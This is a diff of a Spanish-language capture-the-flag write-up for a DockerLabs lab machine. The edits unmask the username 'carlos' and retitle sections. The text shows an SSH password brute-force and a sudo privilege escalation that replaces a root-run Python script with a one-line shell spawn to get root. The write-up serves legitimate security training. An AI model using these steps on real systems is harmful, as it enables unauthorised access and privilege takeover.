@@ -65,7 +65,7 @@ Encontramos que aparte del `index.html`, también esta el `index.php`, el cual c
 
 ![Desktop View](/20251027011949.webp){: width="972" height="589" .shadow}
 
-## explotación
+## acceso incial (carlos)
 
 Probamos a ver si se trata de una contraseña para algún usuario del sistema por SSH:
 
@@ -75,29 +75,29 @@ Probamos a ver si se trata de una contraseña para algún usuario del sistema po
 
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 1000000 login tries (l:1000000/p:1), ~15625 tries per task
 [DATA] attacking ssh://172.17.0.2:22/
-[22][ssh] host: 172.17.0.2   login: c*****   password: JIF*************
+[22][ssh] host: 172.17.0.2   login: carlos   password: JIF*************
 ```
 
 Usando las credenciales, accedemos a la maquina por SSH:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
-└─$ ssh c*****@172.17.0.2
-c*****@172.17.0.2's password: 
-c*****@5b1158daff63:~$ whoami
-c*****
+└─$ ssh carlos@172.17.0.2
+carlos@172.17.0.2's password: 
+carlos@5b1158daff63:~$ whoami
+carlos
 ```
 
-## escalada de privilegios
+## escalada de privilegios (root)
 
 Al ir a revisar los permisos SUDO, comprobamos que puede ejecutar un cierto script con Python:
 
 ```bash
-c*****@5b1158daff63:~$ sudo -l
-Matching Defaults entries for c***** on 5b1158daff63:
+carlos@5b1158daff63:~$ sudo -l
+Matching Defaults entries for carlos on 5b1158daff63:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-User c***** may run the following commands on 5b1158daff63:
+User carlos may run the following commands on 5b1158daff63:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
 ```
 
@@ -108,7 +108,7 @@ En [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) encontramos una 
 El contenido del script es el siguiente:
 
 ```bash
-c*****@5b1158daff63:~$ cat /opt/script.py
+carlos@5b1158daff63:~$ cat /opt/script.py
 import shutil
 
 def copiar_archivo(origen, destino):
@@ -124,41 +124,41 @@ if __name__ == '__main__':
 Por desgracia, los permisos nos impiden modificarlo:
 
 ```bash
-c*****@5b1158daff63:~$ ls -la /opt/script.py
--r-xr--r-- 1 c***** root 272 May  7  2024 /opt/script.py
+carlos@5b1158daff63:~$ ls -la /opt/script.py
+-r-xr--r-- 1 carlos root 272 May  7  2024 /opt/script.py
 ```
 
 Sin embargo, el permiso de ejecución sobre un fichero permite no solo la ejecución en sí, sino también el borrado del mismo:
 
 ```
-c*****@5b1158daff63:~$ rm /opt/script.py
+carlos@5b1158daff63:~$ rm /opt/script.py
 rm: remove write-protected regular file '/opt/script.py'? y
-c*****@5b1158daff63:~$ cat /opt/script.py
+carlos@5b1158daff63:~$ cat /opt/script.py
 cat: /opt/script.py: No such file or directory
 ```
 
 Dado que el permiso apunta a un directorio en el cual tenemos permisos para poder crear ficheros (`/opt`), podemos crear uno nuevo que se llame igual que el anterior, pero con el contenido que le indiquemos nosotros:
 
 ```bash
-c*****@5b1158daff63:/opt$ touch /opt/script.py
-c*****@5b1158daff63:/opt$ ls -la
+carlos@5b1158daff63:/opt$ touch /opt/script.py
+carlos@5b1158daff63:/opt$ ls -la
 total 8
-drwxr-xr-x 1 c***** root   4096 Oct 27 00:26 .
+drwxr-xr-x 1 carlos root   4096 Oct 27 00:26 .
 drwxr-xr-x 1 root   root   4096 Oct 27 00:02 ..
--rw-rw-r-- 1 c***** c*****    0 Oct 27 00:26 script.py
+-rw-rw-r-- 1 carlos carlos    0 Oct 27 00:26 script.py
 ```
 
 Editamos el nuevo fichero con la instrucción que indicaban que podemos usar para obtener una consola:
 
 ```bash
-c*****@5b1158daff63:/opt$ cat script.py 
+carlos@5b1158daff63:/opt$ cat script.py 
 import os; os.system("/bin/sh")
 ```
 
 Ahora, ejecutamos el script, y vemos que obtenemos correctamente la consola como el usuario `root`:
 
 ```bash
-c*****@5b1158daff63:/opt$ sudo /usr/bin/python3 /opt/script.py
+carlos@5b1158daff63:/opt$ sudo /usr/bin/python3 /opt/script.py
 # whoami
 root
 ```
